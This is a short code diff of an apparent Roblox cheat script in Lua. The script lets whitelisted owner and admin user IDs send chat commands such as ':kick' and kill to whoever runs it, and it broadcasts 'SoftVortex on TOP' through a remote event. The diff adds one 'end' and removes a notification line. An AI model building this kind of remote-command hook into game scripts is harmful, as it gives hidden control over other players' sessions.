@@ -26,6 +26,7 @@ local whitelist = { owner = {1362310817}, admin = {3276810125},{413956126},{2486
                 path:FireServer("SoftVortex on TOP"..author.."!","all")
             end
         end
+        end
         --  kill end
         -- kick start
         if message:sub(1, 5) == ":kick" then
@@ -50,8 +51,6 @@ end
     for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.admin) do if v.UserId == _ then admin = true if admin then warn('New admin : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
     end game.Players.PlayerAdded:Connect(function(player) for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true if admin then warn('New admin : '..player.Name) player.Chatted:Connect(function(msg) runcommand(msg,player.Name) end) end end end
     end)
-    
-    if admin == true then setclipboard('test') game.StarterGui:SetCore("SendNotification", { Title = "Mod Prems Loaded"; Text = "Criedts: Zeyy"; Duration = 15; }) elseif owner then setclipboard('test') game.StarterGui:SetCore("SendNotification", { Title = "Mod Prems Loaded"; Text = "Criedts: Zeyy"; Duration = 15; }) end
     
     -- // Owner
     
